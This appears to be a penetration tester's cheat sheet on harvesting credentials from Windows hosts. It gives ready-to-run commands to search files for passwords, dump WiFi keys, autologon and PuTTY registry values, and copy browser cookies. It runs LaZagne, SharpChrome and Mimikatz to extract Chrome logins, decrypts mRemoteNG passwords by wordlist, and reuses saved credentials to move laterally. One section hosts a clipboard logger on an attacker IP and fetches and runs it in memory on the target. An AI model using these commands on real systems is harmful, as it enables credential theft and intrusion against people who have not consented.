# Pain and suffering

## Search potential password

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Less noise

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Find and cat

```cmd
findstr /si password *.xml *.ini *.txt *.config
```

```cmd
findstr /spin "password" *.*
```

Most reliable

```powershell
Get-ChildItem C:\Users -Include * -File -Recurse -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue
```

## Search file extension

```cmd
dir /S /B *pass*.txt <mark> *pass*.xml </mark> *pass*.ini <mark> *cred* </mark> *vnc* == *.config*
```

```cmd
where /R C:\ *.config
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.vnc, *.cred, *.zip, *.rar, *.7z, *.kdbx, *.kdb, *.psafe* -ErrorAction Ignore
```

---
# Lazagne

[Github Page](https://github.com/AlessandroZ/LaZagne)

Download and transfer binary to target machine

```sh
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
```

Run on target machine

```cmd
.\lazagne.exe all
```

---
# Manual

## Autologon

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Wifi password

```cmd
netsh wlan show profile
```

```cmd
netsh wlan show profile <profile_name> key=clear
```

## Sticky notes

```cmd
%USERPROFILE%\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\*
```

## Putty

```cmd
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

```cmd
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<session_name>
```

## Firefox Cookies

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

## Clipboard logger

Download and host on attacker machine

```sh
wget https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1
python3 -m http.server 80
```

Run on target machine

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.57/Invoke-Clipboard.ps1')

Invoke-ClipboardLogger
```

---
# Chrome

## Dictionary file

```powershell
gc 'C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'
```

## Stored credentials

### `SharpChrome.exe`

[Github Page](https://github.com/GhostPack/SharpDPAPI)

[Binary Link](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpChrome.exe)

Download and transfer to target machine

```sh
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpChrome.exe
```

Run on target machine:

Extract login creds

```cmd
.\SharpChrome.exe logins /unprotect
```

Extract cookies

```cmd
.\SharpChrome.exe cookies /format:json
```

### `Mimikatz.exe`

```cmd
.\mimikatz.exe "dpapi::chrome /in:"C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect" "exit"
```

---
# mRemoteNG

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`

Copy the password from the xml file. That pass is encrypted

```cmd
type %USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml
```

Download the tool to begin decrypting on attacker machine

[Github Page](https://github.com/haseebT/mRemoteNG-Decrypt)

```sh
wget https://github.com/haseebT/mRemoteNG-Decrypt/raw/refs/heads/master/mremoteng_decrypt.py
```

Decrypt password. Default key is `mR3m`, and this tool will try it if `-p` is not supplied

```sh
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
```

Decrypt with a wordlist

```sh
for key in $(cat /usr/share/wordlists/fasttrack.txt); do echo $key; python3 mremoteng_decrypt.py -p $key -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" 2>/dev/null; done
```

---
# Restic

You need an environment variable for restic password. But not setting this variable is fine, it will just prompt you for password every command

```powershell
$env:RESTIC_PASSWORD = 'Password'
```

List backups in a repository. `-r` to specify path to `restic` backup repo

```powershell
restic.exe -r E:\restic2\ snapshots
```

Restore a backup. `9971e881` is the ID of the backup you listed above

```powershell
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

---
# Windows credential manager

> Normal user can access their own `Credential Locker` without needing admin privilege.

## Control pannel

![](/images/26dcc6456433469d78ff3ed3c3f6ca48.png)
Or

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

## CLI

```cmd
cmdkey /list
```

You might find a domain credential like this:

```
	Target: Domain:interactive=COMPUTER\user
    Type: Domain Password
    User: COMPUTER\user
```

Which you can use to move laterally

```cmd
runas /savecred /user:COMPUTER\user cmd
```

---
# Search string in office files (on linux)

From [here](https://stackoverflow.com/questions/11462184/search-ms-word-files-in-a-directory-for-specific-content-in-linux)

```sh
#!/bin/bash
   echo -e "\n
Welcome to scandocs. This will search .doc AND .docx files in this directory for a given string. \n
Type in the text string you want to find... \n"
   read response
   find . -name "*.doc" | 
       while read i; do catdoc "$i" | 
                 grep --color=auto -iH --label="$i" "$response"; done
   find . -name "*.docx" | 
       while read i; do docx2txt < "$i" | 
                 grep --color=auto -iH --label="$i" "$response"; done
```